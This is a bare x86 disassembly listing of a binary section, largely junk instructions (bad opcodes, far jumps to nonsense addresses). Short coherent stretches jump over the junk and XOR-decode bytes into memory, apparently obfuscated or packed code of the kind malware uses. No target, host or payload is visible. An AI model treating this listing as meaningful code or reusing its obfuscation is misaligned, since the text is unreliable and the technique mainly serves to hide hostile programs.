  40292a:	repz mov eax,ds:0x4af758f
  402930:	ret    
  402931:	pop    eax
  402932:	xor    eax,esp
  402934:	es stos BYTE PTR es:[edi],al
  402936:	xor    al,0x6b
  402938:	xor    dh,BYTE PTR [esi-0x46]
  40293b:	enter  0x96ca,0x43
  40293f:	inc    DWORD PTR [eax]
  402941:	sahf   
  402942:	push   0x1bb93427
  402947:	leave  
  402948:	push   ebp
  402949:	dec    edi
  40294a:	push   ss
  40294b:	pop    esp
  40294c:	inc    DWORD PTR [ecx-0x562db26b]
  402952:	dec    ebp
  402953:	mov    ebp,DWORD PTR [ebp-0x75d36bdb]
  402959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40295a:	or     cl,bh
  40295c:	sub    al,0x7a
  40295e:	lods   al,BYTE PTR ds:[esi]
  40295f:	xchg   ecx,eax
  402960:	push   0x69
  402962:	xor    ebx,DWORD PTR [ebp-0x2013fa18]
  402968:	sahf   
  402969:	dec    ecx
  40296a:	pop    esp
  40296b:	call   0xafda38aa
  402970:	(bad)  
  402971:	jns    0x4029cf
  402973:	add    eax,0xb01fae05
  402978:	push   edi
  402979:	cmp    DWORD PTR [ebp-0x5],esi
  40297c:	sbb    BYTE PTR [esi+0x56b3dfbc],dl
  402982:	pushf  
  402983:	pop    ebp
  402984:	lods   eax,DWORD PTR ds:[esi]
  402985:	mul    DWORD PTR [eax]
  402987:	sub    bh,BYTE PTR [ecx+eax*4-0x42b61aad]
  40298e:	lds    ecx,FWORD PTR ds:0x10923fb2
  402994:	pushf  
  402995:	push   es
  402996:	pushf  
  402997:	call   0xf7bd:0xd9aad20f
  40299e:	ret    0x3351
  4029a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4029a2:	(bad)  [edi]
  4029a4:	test   dl,dl
  4029a6:	jmp    0x40292d
  4029a8:	pop    ecx
  4029a9:	and    eax,0x191c5b13
  4029ae:	mov    BYTE PTR [ecx],ch
  4029b0:	sbb    esi,0x22
  4029b3:	(bad)  
  4029b4:	adc    al,ah
  4029b6:	push   ebx
  4029b7:	adc    esi,edx
  4029b9:	jle    0x4029de
  4029bb:	stos   BYTE PTR es:[edi],al
  4029bc:	stos   BYTE PTR es:[edi],al
  4029bd:	pushf  
  4029be:	mov    ds:0xf84240af,eax
  4029c3:	adc    ebp,edi
  4029c5:	outs   dx,BYTE PTR ds:[esi]
  4029c6:	pop    ecx
  4029c7:	(bad)  
  4029c8:	push   esi
  4029c9:	aad    0x1f
  4029cb:	inc    edx
  4029cc:	lods   al,BYTE PTR ds:[esi]
  4029cd:	lods   al,BYTE PTR ds:[esi]
  4029ce:	mov    ecx,0x5bcc888f
  4029d3:	dec    eax
  4029d4:	ficomp DWORD PTR ds:0xb6b9b225
  4029da:	ret    0x7cf8
  4029dd:	jb     0x4029cb
  4029df:	inc    edi
  4029e0:	sbb    al,BYTE PTR [eax-0x80]
  4029e3:	mov    ebp,0x72f6406e
  4029e8:	xchg   ebx,eax
  4029e9:	sub    BYTE PTR [edi+0x79],0xab
  4029ed:	scas   eax,DWORD PTR es:[edi]
  4029ee:	cmp    esi,DWORD PTR [eax-0x4c4329d0]
  4029f4:	clc    
  4029f5:	pop    es
  4029f6:	adc    BYTE PTR [ebx+edi*4],ch
  4029f9:	jne    0x402a53
  4029fb:	dec    esi
  4029fc:	adc    eax,DWORD PTR [ecx+0x39947c0]
  402a02:	stos   BYTE PTR es:[edi],al
  402a03:	ins    BYTE PTR es:[edi],dx
  402a04:	jle    0x402a4a
  402a06:	dec    esi
  402a07:	addr16 hlt 
  402a09:	fwait
  402a0a:	push   cs
  402a0b:	pop    esi
  402a0c:	push   edx
  402a0d:	das    
  402a0e:	sub    DWORD PTR [esi+esi*1+0x458b601e],ecx
  402a15:	aam    0xf
  402a17:	test   DWORD PTR [ebx],eax
  402a19:	add    BYTE PTR [eax],al
  402a1b:	add    BYTE PTR [ebx-0x39cc0fbb],cl
  402a21:	add    eax,edi
  402a23:	jmp    0x402bc4
  402a28:	or     al,0x32
  402a2a:	retf   
  402a2b:	jecxz  0x402a1e
  402a2d:	jecxz  0x402a63
  402a2f:	icebp  
  402a30:	loop   0x402a16
  402a32:	mov    bl,0xe4
  402a34:	shl    BYTE PTR [ecx],0x9e
  402a37:	mov    WORD PTR [edx-0x58181f3],gs
  402a3d:	jg     0x402abd
  402a3f:	jle    0x4029d4
  402a41:	adc    DWORD PTR [eax],eax
  402a43:	fist   DWORD PTR [ebp-0x7d]
  402a46:	add    ch,ch
  402a48:	loop   0x402aa4
  402a4a:	inc    esi
  402a4b:	jbe    0x402a8d
  402a4d:	bound  ecx,QWORD PTR [edi]
  402a4f:	aas    
  402a50:	xchg   edi,eax
  402a51:	push   0x72
  402a53:	jb     0x402a25
  402a55:	dec    ebx
  402a56:	outs   dx,BYTE PTR ds:[esi]
  402a57:	or     BYTE PTR [ecx+eiz*4-0xa42198d],0x3c
  402a5f:	in     al,0x49
  402a61:	les    edi,FWORD PTR [edx+ecx*1]
  402a64:	push   ebx
  402a65:	push   eax
  402a66:	pop    esi
  402a67:	loop   0x402a73
  402a69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402a6a:	imul   ebx,DWORD PTR [edx],0xfffffffd
  402a6d:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402a6f:	dec    esi
  402a70:	ins    DWORD PTR es:[edi],dx
  402a71:	sub    BYTE PTR [eax],bh
  402a73:	cmp    BYTE PTR [edi+0x72],bl
  402a76:	sub    BYTE PTR [ebx-0x18],cl
  402a79:	cli    
  402a7a:	xor    DWORD PTR [eax-0x5f],ebx
  402a7d:	enter  0xb2b4,0xce
  402a81:	or     bl,al
  402a83:	into   
  402a84:	dec    ebp
  402a85:	xchg   edi,eax
  402a86:	and    eax,0x69a627d
  402a8b:	push   0x26
  402a8d:	pop    ebx
  402a8e:	pop    edx
  402a8f:	ja     0x402b0f
  402a91:	mov    bh,BYTE PTR [esi+0x21]
  402a94:	cdq    
  402a95:	inc    ecx
  402a96:	popa   
  402a97:	clc    
  402a98:	ja     0x402a98
  402a9a:	pop    ds
  402a9b:	jg     0x402a78
  402a9d:	jmp    0x1daa:0xa6646d7e
  402aa4:	loop   0x402a2d
  402aa6:	sbb    DWORD PTR [ecx+ebx*2-0x39710d65],esp
  402aad:	ins    BYTE PTR es:[edi],dx
  402aae:	sub    BYTE PTR [edx-0x369aec27],al
  402ab4:	loop   0x402a4c
  402ab6:	outs   dx,DWORD PTR ds:[esi]
  402ab7:	jmp    0xcf72:0x5e3a6e07
  402abe:	push   ebp
  402abf:	aam    0x5b
  402ac1:	mov    al,ds:0x5b5abad1
  402ac6:	or     DWORD PTR [ebx],esp
  402ac8:	std    
  402ac9:	daa    
  402aca:	jl     0x402a7d
  402acc:	add    esp,DWORD PTR [edi-0x4e24a1da]
  402ad2:	retf   
  402ad3:	dec    esi
  402ad4:	(bad)  
  402ad5:	jnp    0x402aa2
  402ad7:	adc    eax,0x79f6a715
  402adc:	push   es
  402add:	cmp    BYTE PTR [edi+ecx*8],bh
  402ae0:	mov    edi,0x56097902
  402ae5:	xchg   ebp,eax
  402ae6:	mov    dh,0xaa
  402ae8:	xor    dl,dl
  402aea:	ds sbb al,0x29
  402aed:	add    eax,0x1d3b50ce
  402af2:	out    dx,al
  402af3:	mov    ds:0x8130aeb3,al
  402af8:	cdq    
  402af9:	mov    dh,0x49
  402afb:	sbb    cl,0x70
  402afe:	add    ch,BYTE PTR [esi]
  402b00:	xlat   BYTE PTR ds:[ebx]
  402b01:	jnp    0x402b6a
  402b03:	xor    edi,DWORD PTR [edx]
  402b05:	arpl   WORD PTR [edi],si
  402b07:	xor    eax,0x6f4941cc
  402b0c:	lods   eax,DWORD PTR ds:[esi]
  402b0d:	mov    bl,0xbe
  402b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b10:	lods   al,BYTE PTR ds:[esi]
  402b11:	and    eax,DWORD PTR [eax-0x4d]
  402b14:	xor    al,0x6a
  402b16:	in     al,0x71
  402b18:	push   es
  402b19:	jno    0x402b1d
  402b1b:	mov    ebx,0x7dfbd3e1
  402b20:	mov    ebx,0x7e5db9d6
  402b25:	cmp    dh,dl
  402b27:	xchg   edx,eax
  402b28:	add    bh,BYTE PTR ds:0x56ba793
  402b2e:	ror    BYTE PTR [eax],cl
  402b30:	dec    eax
  402b31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b32:	xchg   ecx,eax
  402b33:	xor    ebx,DWORD PTR [ebx+0x5e7439c5]
  402b39:	jmp    0x2265cb00
  402b3e:	addps  xmm2,XMMWORD PTR [edx-0x41]
  402b42:	sti    
  402b43:	inc    ebx
  402b44:	stos   DWORD PTR es:[edi],eax
  402b45:	aaa    
  402b46:	fcomp  DWORD PTR [ecx+0x5d3c0082]
  402b4c:	add    dh,dh
  402b4e:	push   cs
  402b4f:	rol    ch,1
  402b51:	fwait
  402b52:	(bad)  
  402b53:	xchg   ebp,eax
  402b54:	xchg   esi,eax
  402b55:	popf   
  402b56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402b57:	imul   BYTE PTR [esi]
  402b59:	loope  0x402b0a
  402b5b:	sti    
  402b5c:	pushf  
  402b5d:	out    dx,eax
  402b5e:	pop    ds
  402b5f:	push   es
  402b60:	jle    0x402b2f
  402b62:	jo     0x402b4a
  402b64:	and    bh,BYTE PTR [ebx]
  402b66:	cmp    al,0xe6
  402b68:	sub    ah,bh
  402b6a:	js     0x402b24
  402b6c:	sbb    al,0x46
  402b6e:	sub    DWORD PTR [edi+0x584580aa],esi
  402b74:	add    eax,0x7042fd87
  402b79:	mov    esi,0x7aa1e4e0
  402b7e:	scas   eax,DWORD PTR es:[edi]
  402b7f:	mov    dl,0xbe
  402b81:	dec    edx
  402b82:	jno    0x402b34
  402b84:	mov    ebx,0xde26090f
  402b89:	shl    BYTE PTR [ebx],cl
  402b8b:	(bad)  
  402b8c:	out    dx,al
  402b8d:	sbb    al,bh
  402b8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b90:	ss out 0x93,al
  402b93:	mov    ebp,0x39139c4f
  402b98:	ret    0x1c48
  402b9b:	cli    
  402b9c:	dec    esp
  402b9d:	sbb    DWORD PTR [ebx],ebx
  402b9f:	push   cs
  402ba0:	push   edi
  402ba1:	jae    0x402b5b
  402ba3:	ins    BYTE PTR es:[edi],dx
  402ba4:	call   0xe055a215
  402ba9:	sub    DWORD PTR [edi+0x34b0e44f],0x12
  402bb0:	cmp    BYTE PTR [ebp+0x4236f294],bl
  402bb6:	dec    edi
  402bb7:	popf   
  402bb8:	push   esp
  402bb9:	inc    eax
  402bba:	sbb    eax,0x4c17212c
  402bbf:	cs ret 
  402bc1:	sbb    eax,0xc0858bfd
  402bc6:	je     0x402bf4
  402bcc:	lea    eax,[ebp-0x98]
  402bd2:	push   eax
  402bd3:	mov    eax,DWORD PTR [ebp-0x1c]
  402bd6:	xor    eax,esi
  402bd8:	add    eax,edi
  402bda:	push   eax
  402bdb:	mov    eax,DWORD PTR [ebp-0x18]
  402bde:	add    eax,0xee
  402be3:	push   eax
  402be4:	mov    eax,DWORD PTR [ebp-0x18]
  402be7:	mov    eax,DWORD PTR [eax+0x198]
  402bed:	push   DWORD PTR [eax]
  402bef:	call   0x40984d
  402bf4:	mov    ecx,DWORD PTR [ebp-0x28]
  402bf7:	xor    ecx,esi
  402bf9:	mov    eax,0xffcd8d65
  402bfe:	sub    eax,ecx
  402c00:	jmp    0x402da1
  402c05:	add    DWORD PTR [edx-0x2e6a296b],ecx
  402c0b:	inc    ecx
  402c0c:	dec    ecx
  402c0d:	aas    
  402c0e:	cmp    al,0x84
  402c10:	out    dx,al
  402c11:	aam    0x91
  402c13:	sbb    DWORD PTR [edx+0x36],esi
  402c16:	or     edi,DWORD PTR [esi+0x7e]
  402c19:	cli    
  402c1a:	jg     0x402c9a
  402c1c:	jle    0x402bfd
  402c1e:	cmp    DWORD PTR [ebx+0x351b784a],0xfffffff0
  402c25:	es push ss
  402c27:	or     ah,ch
  402c29:	sub    ebp,0x9162b76d
  402c2f:	pop    ss
  402c30:	pop    esi
  402c31:	mov    ebp,0xc721a547
  402c36:	dec    ebp
  402c37:	add    esp,ebp
  402c39:	adc    esi,DWORD PTR [ebx+0x77d6c1b0]
  402c3f:	push   0x11336ee0
  402c44:	mov    ch,0x24
  402c46:	dec    edi
  402c47:	pusha  
  402c48:	cli    
  402c49:	or     esi,DWORD PTR [ebx+0x57]
  402c4c:	mov    ds:0x7476cd68,al
  402c51:	retf   0x8755
  402c54:	inc    edi
  402c55:	xchg   esp,eax
  402c56:	mov    ds:0x475d6502,al
  402c5b:	add    eax,DWORD PTR [ebx+0x115d8a6c]
  402c61:	sub    al,al
  402c63:	and    esp,DWORD PTR [edi]
  402c65:	push   cs
  402c66:	mov    BYTE PTR [edx],dl
  402c68:	stos   BYTE PTR es:[edi],al
  402c69:	pop    edi
  402c6a:	daa    
  402c6b:	sub    BYTE PTR [ebp+0x3b],bl
  402c6e:	mov    al,0xdd
  402c70:	imul   ecx,DWORD PTR [esi],0xc72e0876
  402c76:	loope  0x402c0a
  402c78:	repnz mov dl,0xd7
  402c7b:	(bad)  
  402c7c:	retf   
  402c7d:	xor    DWORD PTR [ebx-0x2fc06473],ebx
  402c83:	sti    
  402c84:	pop    ebx
  402c85:	fistp  DWORD PTR [ecx-0x3ae6a4ba]
  402c8b:	xor    ecx,edx
  402c8d:	cwde   
  402c8e:	jl     0x402cbc
  402c90:	dec    edi
  402c91:	push   ebp
  402c92:	jnp    0x402ccd
  402c94:	xchg   edx,eax
  402c95:	lahf   
  402c96:	add    BYTE PTR [edx],al
  402c98:	popa   
  402c99:	js     0x402ce7
  402c9b:	inc    ecx
  402c9c:	or     eax,0x94b61085
  402ca1:	jne    0x402ce2
  402ca3:	inc    eax
  402ca4:	and    DWORD PTR [esi-0x5df06bb9],0xffffffc1
  402cab:	inc    edx
  402cac:	xor    dh,BYTE PTR [ebx-0x76afeffe]
  402cb2:	fsub   QWORD PTR [edi+edi*1-0x46]
  402cb6:	lods   al,BYTE PTR ds:[esi]
  402cb7:	dec    ecx
  402cb8:	shl    edx,1
  402cba:	cdq    
  402cbb:	loopne 0x402cb3
  402cbd:	daa    
  402cbe:	pop    eax
  402cbf:	dec    esi
  402cc0:	pusha  
  402cc1:	rep outs dx,BYTE PTR ds:[esi]
  402cc3:	popa   
  402cc4:	les    esi,FWORD PTR [ecx]
  402cc6:	cld    
  402cc7:	loopne 0x402c7c
  402cc9:	mov    ds:0x996c3fe,eax
  402cce:	or     cl,BYTE PTR [eax]
  402cd0:	fbstp  TBYTE PTR [esi]
  402cd2:	push   eax
  402cd3:	stos   DWORD PTR es:[edi],eax
  402cd4:	jge    0x402cb7
  402cd6:	cmp    eax,0x8363229a
  402cdb:	dec    ebp
  402cdc:	xchg   ecx,eax
  402cdd:	dec    ebx
  402cde:	retf   
  402cdf:	inc    eax
  402ce0:	xchg   esp,eax
  402ce1:	mov    bh,0xcb
  402ce3:	je     0x402cca
  402ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402ce6:	mov    ebx,0xe75b797d
  402ceb:	hlt    
  402cec:	push   es
  402ced:	xchg   esi,eax
  402cee:	fild   DWORD PTR [edx+0x4058faa]
  402cf4:	or     esi,DWORD PTR [ebx+0x973df4c]
  402cfa:	pop    eax
  402cfb:	ins    DWORD PTR es:[edi],dx
  402cfc:	mov    edi,ecx
  402cfe:	sbb    al,0x32
  402d00:	jl     0x402d08
  402d02:	mov    edx,fs
  402d04:	pop    edi
  402d05:	jnp    0x402d34
  402d07:	in     eax,dx
  402d08:	inc    eax
  402d09:	jle    0x402cc7
  402d0b:	data16 mov ds:0xe4010a04,al
  402d11:	cmp    bl,BYTE PTR [edi+0x36]
  402d14:	adc    BYTE PTR [ebp+edx*1-0x50656d7d],cl
  402d1b:	into   
  402d1c:	outs   dx,DWORD PTR ds:[esi]
  402d1d:	and    eax,0x7a66b05b
  402d22:	jp     0x402d22
  402d24:	ja     0x402d88
  402d26:	mov    dl,BYTE PTR ds:0xc98db114
  402d2c:	cdq    
  402d2d:	sbb    BYTE PTR [esi+0x4e],bl
  402d30:	add    DWORD PTR [eax+eax*8-0x26],ecx
  402d34:	push   ebx
  402d35:	mov    WORD PTR [eax],ss
  402d37:	sar    BYTE PTR [edi+0x7aede4d],0x6b
  402d3e:	sbb    eax,0xb247f94d
  402d43:	int    0x60
  402d45:	mov    esi,0xe7a77ebc
  402d4a:	jno    0x402d86
  402d4c:	mov    edx,0x5b1252c7
  402d51:	cmp    cl,BYTE PTR [ecx]
  402d53:	mov    dl,0x48
  402d55:	sbb    ecx,ebp
  402d57:	int3   
  402d58:	pop    esp
  402d59:	sub    dh,BYTE PTR [ebx-0x6b]
  402d5c:	ds inc eax
  402d5e:	dec    DWORD PTR [ebp+0x533ffa4a]
  402d64:	out    dx,al
  402d65:	fidivr WORD PTR [ebx+0x30e8398a]
  402d6b:	nop
  402d6c:	ret    
  402d6d:	mov    ah,0x1c
  402d6f:	jl     0x402de0
  402d71:	out    dx,eax
  402d72:	stos   BYTE PTR es:[edi],al
  402d73:	(bad)  
  402d75:	aas    
  402d76:	xlat   BYTE PTR ds:[ebx]
  402d77:	mov    esp,0x8d6ac03f
  402d7c:	aam    0xc8
  402d7e:	int3   
  402d7f:	and    dl,ch
  402d81:	lahf   
  402d82:	sbb    al,0x31
  402d84:	test   DWORD PTR [ebx+0x3a],ebp
  402d87:	pop    es
  402d88:	div    DWORD PTR [ebp-0x5c395a01]
  402d8e:	popf   
  402d8f:	push   cs
  402d90:	fcmovu st,st(4)
  402d92:	and    eax,0x1f6450f1
  402d97:	call   0x11136be4
  402d9c:	push   es
  402d9d:	jmp    0xfc45:0x2b44cdfd
  402da4:	mov    ecx,DWORD PTR [ebp-0x48]
  402da7:	add    ecx,eax
  402da9:	mov    eax,DWORD PTR [ebp-0x4]
  402dac:	mov    DWORD PTR [eax+0x1],ecx
  402daf:	mov    al,BYTE PTR [ebp-0x11]
  402db2:	mov    ecx,DWORD PTR [ebp-0x4]
  402db5:	xor    al,0x46
  402db7:	sub    al,0x38
  402db9:	mov    BYTE PTR [ecx],al
  402dbb:	lea    eax,[ebp-0x4]
  402dbe:	inc    BYTE PTR [eax]
  402dc0:	inc    eax
  402dc1:	push   eax
  402dc2:	pop    ecx
  402dc3:	dec    ecx
  402dc4:	xchg   ecx,edx
  402dc6:	dec    BYTE PTR [edx]
  402dc8:	push   DWORD PTR [ebp-0x18]
  402dcb:	mov    eax,ds:0x413bf0
  402dd0:	mov    eax,DWORD PTR [eax]
  402dd2:	push   DWORD PTR [eax]
  402dd4:	jmp    0x402f75
  402dd9:	jmp    0x402df6
  402ddb:	xchg   dh,bl
  402ddd:	push   esi
  402dde:	arpl   WORD PTR [ebx+0x2b],si
  402de1:	nop
  402de2:	push   edi
  402de3:	ror    BYTE PTR [ebp+edi*8-0x77],1
  402de7:	mov    WORD PTR [esi-0x4e],es
  402dea:	or     BYTE PTR [esi+0x7e],bh
  402ded:	cli    
  402dee:	jg     0x402e6e
  402df0:	jle    0x402e00
  402df2:	xor    BYTE PTR [ebx+eiz*2-0x20],bh
  402df6:	dec    ebx
  402df7:	lock shl cl,0xbb
  402dfb:	push   eax
  402dfc:	jge    0x402e53
  402dfe:	cdq    
  402dff:	pushf  
  402e00:	ja     0x402e74
  402e02:	dec    ebx
  402e03:	adc    ebp,DWORD PTR [ebp-0x23]
  402e06:	xchg   edx,eax
  402e07:	std    
  402e08:	adc    al,0xd4
  402e0a:	pop    esi
  402e0b:	outs   dx,DWORD PTR ds:[esi]
  402e0c:	das    
  402e0d:	daa    
  402e0e:	cli    
  402e0f:	outs   dx,BYTE PTR ds:[esi]
  402e10:	bound  esi,QWORD PTR es:[ecx-0x4ca5f033]
  402e17:	mov    edi,DWORD PTR [edx+0x50]
  402e1a:	mov    al,0x2d
  402e1c:	out    0x88,al
  402e1e:	sub    eax,0xbd560f3a
  402e23:	xor    al,0xc1
  402e25:	dec    esi
  402e26:	(bad)  
  402e27:	ror    BYTE PTR [esi+0x15],cl
  402e2a:	fstp   DWORD PTR [edi]
  402e2c:	xor    ch,dl
  402e2e:	sbb    al,0x11
  402e30:	or     eax,DWORD PTR [edi+0x2bb77658]
  402e36:	cmp    eax,0xcc258950
  402e3b:	mov    edx,0x4b68120d
  402e40:	inc    ebp
  402e41:	scas   eax,DWORD PTR es:[edi]
  402e42:	iret   
  402e43:	cli    
  402e44:	xchg   ebp,eax
  402e45:	scas   al,BYTE PTR es:[edi]
  402e46:	push   cs
  402e47:	imul   edx,esi,0x2e
  402e4a:	add    esp,DWORD PTR [ecx]
  402e4c:	push   ebp
  402e4d:	inc    eax
  402e4e:	adc    ebp,ebx
  402e50:	xor    ebp,DWORD PTR [edi-0x78]
  402e53:	in     al,dx
  402e54:	pop    ss
  402e55:	in     al,dx
  402e56:	xchg   BYTE PTR [eax-0x1394339d],cl
  402e5c:	popf   
  402e5d:	mov    dh,0x98
  402e5f:	sbb    bl,BYTE PTR [ebx-0x40]
  402e62:	shl    BYTE PTR [esp+ebp*2],1
  402e65:	test   ah,al
  402e67:	test   al,0x6a
  402e69:	imul   edi,DWORD PTR cs:[ebp+0x180461a3],0x7b782852
  402e74:	push   ecx
  402e75:	xchg   esi,eax
  402e76:	ror    DWORD PTR ds:0x186e314,cl
  402e7c:	outs   dx,BYTE PTR ds:[esi]
  402e7d:	sub    eax,DWORD PTR [esi-0x38]
  402e80:	lods   al,BYTE PTR ds:[esi]
  402e81:	out    dx,eax
  402e82:	div    BYTE PTR [eax]
  402e84:	mov    esp,0x5a50a8b0
  402e89:	cmp    DWORD PTR [ecx+0x1c670cc3],edi
  402e8f:	push   ss
  402e90:	(bad)  
  402e91:	sub    al,0xd2
  402e93:	test   al,0x8a
  402e95:	cmc    
  402e96:	(bad)  
  402e97:	aad    0xfa
  402e99:	jae    0x402e4f
  402e9b:	(bad)  
  402e9c:	mov    al,0xee
  402e9e:	out    dx,eax
  402e9f:	or     DWORD PTR [ebx-0x10885bb9],ebx
  402ea5:	aad    0x8e
  402ea7:	retf   
  402ea8:	mov    eax,0x8c518400
  402ead:	and    BYTE PTR [eax-0x9561cfc],ch
  402eb3:	jecxz  0x402e57
  402eb5:	sbb    ebp,eax
  402eb7:	gs sbb ecx,ebp
  402eba:	or     al,0x9
  402ebc:	jge    0x402f0c
  402ebe:	or     edi,DWORD PTR [ecx+0x70]
  402ec1:	inc    ebp
  402ec2:	jle    0x402f13
  402ec4:	sbb    ebp,esp
  402ec6:	fstp   DWORD PTR [ecx-0x3]
  402ec9:	rcr    BYTE PTR [ebx],0x3d
  402ecc:	cmp    BYTE PTR [ecx-0x1],0xe1
  402ed0:	(bad)  
  402ed1:	ins    DWORD PTR es:[edi],dx
  402ed2:	or     esi,edx
  402ed4:	xor    ah,bh
  402ed6:	out    dx,al
  402ed7:	push   ss
  402ed8:	rol    DWORD PTR [ecx+ebp*4-0xb],0xe4
  402edd:	sahf   
  402ede:	and    DWORD PTR [esp+eiz*2],eax
  402ee1:	test   DWORD PTR [esi-0x3a],esi
  402ee4:	push   cs
  402ee5:	mov    eax,0x886edcb6
  402eea:	fs push cs
  402eec:	xchg   esp,eax
  402eed:	call   0xefedbca8
  402ef2:	or     bh,BYTE PTR [ebp-0x7bd1c055]
  402ef8:	icebp  
  402ef9:	sbb    eax,0xeb94bf59
  402efe:	sahf   
  402eff:	retf   0xee1d
  402f02:	les    ebx,FWORD PTR [esi+0x3d]
  402f05:	dec    esp
  402f06:	lea    edx,[edx]
  402f08:	lock pop eax
  402f0a:	mov    eax,ds:0xef75ab8f
  402f0f:	rol    dh,1
  402f11:	sub    al,0x9e
  402f13:	inc    edx
  402f14:	scas   eax,DWORD PTR es:[edi]
  402f15:	in     eax,0x5a
  402f17:	test   BYTE PTR [edx+eax*4-0x626dc19b],ch
  402f1e:	(bad)  
  402f1f:	mov    ecx,0xb5b03c31
  402f24:	cdq    
  402f25:	lods   eax,DWORD PTR ds:[esi]
  402f26:	sar    DWORD PTR [edi+esi*8-0x45],1
  402f2a:	in     eax,dx
  402f2b:	scas   al,BYTE PTR es:[edi]
  402f2c:	pop    ss
  402f2d:	lock arpl WORD PTR [eax+0xc],dx
  402f31:	ins    BYTE PTR es:[edi],dx
  402f32:	add    eax,0x85d66aa1
  402f37:	enter  0xb266,0x73
  402f3b:	pop    ss
  402f3c:	ror    DWORD PTR [edx],cl
  402f3e:	jg     0x402efe
  402f40:	(bad)  
  402f41:	int3   
  402f42:	inc    edi
  402f43:	adc    eax,0x9479e69e
  402f48:	mov    edx,edx
  402f4a:	mov    WORD PTR [esp+ebx*2-0x7bfe819c],es
  402f51:	fld    DWORD PTR [edi-0x5b35f960]
  402f57:	xchg   ebx,eax
  402f58:	mov    al,ds:0x7f15085b
  402f5d:	pop    edx
  402f5e:	mov    ah,0x9f
  402f60:	ins    BYTE PTR es:[edi],dx
  402f61:	xchg   al,al
  402f63:	sbb    edi,ecx
  402f65:	into   
  402f66:	sti    
  402f67:	push   ebx
  402f68:	test   esp,esp
  402f6a:	xchg   al,bh
  402f6c:	(bad)  
  402f6d:	hlt    
  402f6e:	sub    al,0xdd
  402f70:	sbb    DWORD PTR [eax-0xf],edx
  402f73:	test   al,dl
  402f75:	lea    eax,ds:0x413c0c
  402f7b:	push   DWORD PTR [eax]
  402f7d:	lea    eax,ds:0x4139b8
  402f83:	push   DWORD PTR [eax]
  402f85:	lea    eax,ds:0x413bec
  402f8b:	push   DWORD PTR [eax]
  402f8d:	lea    eax,ds:0x413d34
  402f93:	push   DWORD PTR [eax]
  402f95:	xchg   ebx,edx
  402f97:	inc    ebx
  402f98:	inc    ebx
  402f99:	push   ebx
  402f9a:	pop    eax
  402f9b:	jmp    0x40313c
  402fa0:	cmc    
  402fa1:	mov    ebp,0x63b00620
  402fa6:	icebp  
  402fa7:	ins    DWORD PTR es:[edi],dx
  402fa8:	sbb    esi,DWORD PTR [edi-0x2ed75a49]
  402fae:	loop   0x402f47
  402fb0:	ds push ss
  402fb2:	jle    0x403032
  402fb4:	cli    
  402fb5:	jg     0x403035
  402fb7:	jle    0x40300a
  402fb9:	push   cs
  402fba:	inc    ebx
  402fbb:	push   eax
  402fbc:	pop    ebx
  402fbd:	fistp  QWORD PTR [ebx]
  402fbf:	mov    cl,ch
  402fc1:	cwde   
  402fc2:	mov    edx,0xc96f5977
  402fc7:	mov    eax,0xf2d8a9c8
  402fcc:	mov    esp,es
  402fce:	or     BYTE PTR [edi],0xc4
  402fd1:	clc    
  402fd2:	adc    al,0x2c
  402fd4:	mov    al,ds:0x8472117f
  402fd9:	push   ebx
  402fda:	add    eax,0x40ba0633
  402fdf:	hlt    
  402fe0:	pop    es
  402fe1:	outs   dx,BYTE PTR ds:[esi]
  402fe2:	dec    esi
  402fe3:	xor    ecx,DWORD PTR [eax-0x42]
  402fe6:	pop    esp
  402fe7:	jbe    0x402f7f
  402fe9:	mov    eax,0x569d2d74
  402fee:	and    al,0x83
  402ff0:	add    DWORD PTR [esi+0x1efe254],edx
  402ff6:	cmp    ch,BYTE PTR es:[ebx*2+0x57fa5017]
  402ffe:	iret   
  402fff:	les    edi,FWORD PTR [edx+0x50aee00b]
  403005:	jge    0x403044
  403007:	add    eax,0xff227f67
  40300c:	call   0x7bca:0x57a9e064
  403013:	inc    ebp
  403014:	mov    ecx,DWORD PTR [ecx]
  403016:	scas   eax,DWORD PTR es:[edi]
  403017:	dec    esi
  403018:	iret   
  403019:	add    eax,0xf73cf725
  40301e:	mov    esp,ebp
  403020:	inc    esi
  403021:	stos   BYTE PTR es:[edi],al
  403022:	hlt    
  403023:	out    0x30,eax
  403025:	je     0x4030a5
  403027:	xchg   esp,eax
  403028:	pop    edi
  403029:	add    ecx,DWORD PTR [edi]
  40302b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40302c:	arpl   WORD PTR [esi-0x1891f4d7],bp
  403032:	pop    edi
  403033:	push   ebx
  403034:	popa   
  403035:	cmp    esp,ecx
  403037:	jmp    0xeece:0x5cd77bd9
  40303e:	cld    
  40303f:	stc    
  403040:	push   eax
  403041:	ja     0x40304e
  403043:	mov    dh,0x7
  403045:	add    al,0x1d
  403047:	inc    DWORD PTR [ebp+0x28]
  40304a:	pop    eax
  40304b:	mov    eax,0xf1802dd0
  403050:	jns    0x4030cc
  403052:	nop
  403053:	loop   0x402fe4
  403055:	mov    cl,0x4f
  403057:	ror    DWORD PTR [esi+0x19292e57],1
  40305d:	ins    BYTE PTR es:[edi],dx
  40305e:	or     eax,0x99a3a69e
  403063:	sub    DWORD PTR [edi-0x33],ecx
  403066:	mov    al,0xe9
  403068:	mov    ch,0xfc
  40306a:	and    eax,0x39ea42f2
  40306f:	push   ebp
  403070:	in     al,0xde
  403072:	jmp    0x2ab3:0x13d23d4b
  403079:	push   ds
  40307a:	jle    0x403001
  40307c:	inc    esi
  40307d:	ret    0xcb5e
  403080:	cmp    DWORD PTR [ebx-0x7321b2a9],edi
  403086:	sahf   
  403087:	call   0xe12c040c
  40308c:	bsf    esi,DWORD PTR [edi+0x45]
  403090:	call   DWORD PTR [edi-0x667723e5]
  403096:	adc    BYTE PTR [edi+0x4f],0x63
  40309a:	mov    dh,0xcd
  40309c:	mov    edi,0x99dfe3af
  4030a1:	int    0xd4
  4030a3:	mov    bh,0xd0
  4030a5:	cmp    al,0xc1
  4030a7:	dec    eax
  4030a8:	mov    ebp,esp
  4030aa:	sub    al,0xd6
  4030ac:	and    DWORD PTR [eax],edx
  4030ae:	jle    0x4030a5
